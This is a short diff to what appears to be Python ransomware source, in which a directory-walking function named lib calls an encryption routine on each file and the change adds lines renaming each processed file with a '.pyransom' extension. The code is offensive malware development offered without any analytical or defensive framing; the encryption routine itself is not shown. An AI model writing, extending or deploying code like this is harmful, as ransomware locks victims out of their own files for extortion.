@@ -65,6 +65,7 @@ def lib(mulu):
                     else:
                         try:
                             en(str(mulu)+str(path)+r'/'+str(file))
+                            os.rename(mulu+path+r'/'+file,mulu+path+'/'+file+".pyransom")
                         except:
                             os.rename(mulu+path+r'/'+file,mulu+path+'/'+file+".pyransom")
                             pass
@@ -81,6 +82,7 @@ def lib(mulu):
                     else:
                         try:
                             en(str(mulu)+str(file))
+                            os.rename(mulu+file,mulu+file+".pyransom")
                         except:
                             os.rename(mulu+file,mulu+file+".pyransom")
                             pass
